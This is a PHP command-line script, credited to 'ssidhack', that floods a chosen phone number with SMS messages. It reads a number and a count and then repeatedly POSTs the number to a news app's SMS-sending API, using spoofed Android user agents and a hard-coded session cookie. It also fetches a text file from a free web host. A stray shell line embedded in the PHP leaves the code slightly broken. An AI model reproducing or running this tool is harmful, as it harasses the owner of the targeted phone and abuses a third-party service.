<?php
$pesan = file_get_contents('http://aos-file.000webhostapp.com/cSms-api/notes.txt');
function bom($hp){
$data = array("mobile" => $hp); $data_string = json_encode($data);
$ch = curl_init('https://ai.caping.co.id/v2/sms/send');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Linux; Android 7.1; Oppo A71 Build/OPM7.181105.004; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36;CapingNews/4.1.5');
curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);curl_setopt($ch, CURLOPT_HTTPHEADER, array('Cookie: u=61649310;n=000000007b627328fffffffff1110836','Content-Type: application/json','Content-Length: 26','NETWORKSTATE: FouthG','User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; Redmi 4A Build/OPM7.181105.004; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36;CapingNews/4.1.5'));
$result = curl_exec($ch);
curl_close($ch);
echo $result;
echo "\n";
}
system('clear');
echo "Creator\t\t:\ssidhack\n\n";
echo "<[ Sms-api ]>\n";
cowsay -f eyes SSIDHACK | lolcat
echo "____________________\n\n";
echo "pengirim\t: ";
$nama = trim(fgets(STDIN)) ;
echo "pesan\t: "; 
$pesan = trim(fgets(STDIN)) ;
echo "Nomer dimulai dari 62..\nMasukkan Nomer\t: ";
$no = trim(fgets(STDIN));
echo "Jumlah  Bom\t: ";
$jumlah = trim(fgets(STDIN));
$i=0;
while($i<$jumlah)
    {
			sleep(0.2);
			$i++;
		    bom($no);
	};
?>